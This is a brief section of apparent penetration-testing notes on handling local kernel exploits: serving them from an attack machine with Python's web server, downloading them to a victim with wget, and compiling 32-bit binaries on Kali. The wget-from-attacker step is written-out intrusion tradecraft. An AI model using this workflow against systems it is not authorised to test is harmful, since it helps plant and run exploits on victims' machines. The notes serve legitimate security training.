# Working with exploits
This section is mostly about local kernel exploits, because they're annoying. Remote python exploits are usually point-and-shoot and web exploits are covered in (exploitation/web-application/README.md).

## Transferring exploits
The quickest way to transfer an exploit is to create a folder for your exploits and expose it with Python's webserver:
```
python -m SimpleHTTPServer 80
```
The port defaults to 8000 but 80 and 443 are usually accessible. Make sure your port choice doesn't conflict with your shell. On the victim machine, grab files:
```
wget http://[attack machine]/exploit.c
```

## Compiling exploits
First, the usual warning about randomly downloading exploits from the internet: watch out for backdoors. [Exploit-DB](https://www.exploit-db.com/) is reliable.

Second, always read the exploit comments carefully:

* Compiler options to use
* Architecture of the victim machine (32-bit or 64-bit)
* Steps to complete on the victim machine
* Code modifications

Third, if you get error messages during compilation or runtime, google them. Usually this is because the binary was compiled on the attack machine and there are quirks in architecture that can be solved by modifying compile options.

## Compiling 32-bit exploits on a 64-bit machine
If a C compiler is missing or inaccessible on your victim machine, you can compile the exploits on your Kali machine but you need some extra libraries on Kali:
```
apt-get install gcc-multilib
apt-get install g++-multilib
```
You will also need to add the `-m32` flag to your compile command.
